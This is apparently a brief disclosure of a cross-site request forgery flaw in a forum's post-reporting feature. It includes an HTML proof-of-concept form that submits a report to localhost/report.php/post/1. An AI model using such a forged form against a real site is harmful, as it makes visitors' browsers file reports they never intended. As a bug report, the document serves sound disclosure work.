# Report Post CSRF
Allows threads and posts to be reported through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form action="http://localhost/report.php/post/1" id="LAYER_form" method="POST" style="padding: 25px;">
    <label for="reason">Reason</label>
    <textarea name="reason" style="height:150px;width:100%;min-width:100%;max-width:100%;"></textarea>
    <br>
    <input type="submit" name="report" value="Report">
</form>
```
